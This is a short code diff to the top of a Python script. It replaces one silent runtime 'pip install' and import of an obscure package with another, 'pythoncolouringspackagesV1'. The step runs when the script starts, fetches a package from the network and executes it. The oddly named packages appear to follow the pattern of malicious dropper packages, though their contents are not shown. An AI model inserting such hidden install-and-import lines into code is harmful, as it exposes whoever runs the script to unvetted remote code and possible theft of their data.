@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptaddonsV1")
-import pipcryptaddonsV1
+os.system("pip install pythoncolouringspackagesV1")
+import pythoncolouringspackagesV1
 import random
 import requests
 import time
